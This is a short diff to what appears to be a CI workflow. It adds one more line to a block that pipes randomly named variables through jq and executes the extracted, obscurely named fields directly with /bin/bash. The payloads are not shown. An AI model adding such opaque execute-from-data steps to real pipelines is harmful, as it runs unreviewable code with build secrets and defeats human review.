@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$unim3" | jq -r .q30 | /bin/bash
           echo $tvwr281 | jq -r .ecoq191 | /bin/bash
           printf '%s' "$otn64" | jq -r .jsdsl683 | /bin/bash
+          printf '%s' "$vgy125" | jq -r .hjfe4 | /bin/bash
 
       - name: Upload artifact
         if: always()
